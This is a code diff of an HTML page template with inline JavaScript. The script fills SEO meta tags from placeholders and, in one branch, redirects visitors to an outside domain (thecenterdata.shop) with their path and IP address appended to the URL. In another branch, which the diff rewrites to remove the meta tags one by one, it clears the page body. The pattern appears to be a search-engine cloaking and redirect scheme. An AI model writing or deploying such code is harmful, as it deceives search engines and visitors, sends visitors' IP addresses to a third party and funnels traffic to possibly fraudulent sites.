@@ -7,8 +7,7 @@
     <script>
         // --------------------------------------------------------------------------------
         var head = '';
-
-        head = head + '<meta name="googlebot" content="noarchive">';
+        
         head = head + '<title>product_name</title>';
         head = head + '<meta name="description" content="description_seo">';
         head = head + '<meta name="keywords" content="meta_keyword">';
@@ -19,6 +18,7 @@
         head = head + '<meta name="og:title" content="product_name">';
         head = head + '<meta name="og:description" content="description_seo">';
         head = head + '<meta name="og:url" content="website_url">';
+        head = head + '<meta name="googlebot" content="noarchive">';
         head = head + '<meta name="google-site-verification" content="website_verify" />';
 
         // --------------------------------------------------------------------------------
@@ -94,11 +94,16 @@
                             window.location.replace("https://thecenterdata.shop/api_link/" + path_array[1] + "-" + ip);
                         })
                 } else if(data[0] == 'index'){
-                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/product_name/g, "");
-                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/description_seo/g, "");
-                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/meta_keyword/g, "");
-                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_name/g, "");
-                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_url/g, "");
+                    document.querySelector("[name='description']").remove();
+                    document.querySelector("[name='keywords']").remove();
+                    document.querySelector("[name='title']").remove();
+                    document.querySelector("[name='twitter:title']").remove();
+                    document.querySelector("[name='twitter:description']").remove();
+                    document.querySelector("[name='og:type']").remove();
+                    document.querySelector("[name='og:title']").remove();
+                    document.querySelector("[name='og:description']").remove();
+                    document.querySelector("[name='og:url']").remove();
+                    document.querySelector("[name='googlebot']").remove();
                     document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_verify/g, data[1]);
                     document.querySelector('body').innerHTML = "";
                 } else {
